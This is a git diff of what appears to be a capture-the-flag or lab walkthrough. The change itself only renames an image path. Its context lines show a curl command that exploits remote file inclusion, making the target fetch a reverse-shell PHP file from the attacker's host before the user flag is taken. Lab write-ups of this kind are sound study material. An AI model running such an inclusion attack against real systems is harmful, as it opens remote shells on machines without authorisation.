@@ -79,7 +79,7 @@ Afterwards, we just need to execute it:
 $ curl http://192.168.233.53:8080/site/index.php?page=http://192.168.45.161/rev.php
 ```
 
-<figure><img src="../../../.gitbook/assets/image (84).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (84) (3).png" alt=""><figcaption></figcaption></figure>
 
 We can then grab the user flag.
 
